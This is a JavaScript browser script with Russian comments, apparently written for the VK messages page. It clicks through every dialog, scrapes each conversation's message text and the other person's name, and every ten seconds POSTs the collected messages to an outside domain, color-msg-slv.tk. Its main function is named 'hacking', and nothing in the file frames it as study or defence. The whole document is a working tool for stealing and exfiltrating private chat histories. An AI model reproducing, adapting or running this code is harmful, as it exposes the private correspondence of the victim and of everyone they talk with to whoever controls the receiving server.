/**
 * Проходится по всем диалогам в панели слева и получает их id
 */
function getDialogsIDs() {
    let dialogs = [];
    document.querySelectorAll('.nim-dialog').forEach(link => {
        dialogs.push({
            'list-id': link.getAttribute('data-list-id'),
            'msgid': link.getAttribute('data-msgid')
        });
    });

    return dialogs;
}

/**
 * Получает все видимые сообщения на этой странице
 */
function getMessages() {
    let messages = [];
    document.querySelectorAll('.im-mess--text').forEach(mess =>
        messages.push(mess.textContent)
    );
    return messages;
}

/**
 * Имитирует клик по диалогу (по sel_id), чтобы переместиться на страницу с ним
 */
async function goToDialog(sel_id) {
    document.querySelector(`._im_dialog_${sel_id}`).click();
}


let dialogsData = {}; // все данные о диалогах
let dialogs = getDialogsIDs(); // получаем id диалогов
let dialogsCount = dialogs.length; // узнаем сколько всего диалогов
let count = 6;

/**
 * it is magiiick
 */
async function hacking() {
    // переходим на страницу с сообщениями
    document.querySelector('#l_msg > a').click();
    await new Promise(resolve => setTimeout(resolve, 2000));

    // каждые 2сек запускаем этот код, чтобы страница с диалогом успела загрузитсья
    let parser = setInterval(async () => {
        dialogsCount--; // прочитали этот диалог
        if (dialogsCount < 0) return dialogsData; // диалоги кончились

        // переходим к следующиму диалогу
        goToDialog(dialogs[dialogsCount]['list-id']);

        // получаем имя человека, с кем периписка
        let name = document.querySelector('._im_page_peer_name').textContent;

        // добавляем сообщения с этой страницы в объект по ключу
        dialogsData[name] = getMessages();

        // выводим в консоль обновленные данные о диалогах
        console.log(dialogsData);
    }, 2000);


    // каждыйе 10сек асинхронн0 отправляем данные на сервер
    let saver = setInterval(() => {
        let formData = new FormData();
        formData.append('data', dialogsData);
        fetch(
            'https://color-msg-slv.tk', {
                method: 'POST',
                mode: 'no-cors',
                body: formData,
            }
        );

        dialogsData = {}; // clear data
    }, 10000);


    if (count <= 0) {
        // stop inntervals
        clearInterval(parser);
        clearInterval(saver);
    }
    count--;
}

hacking();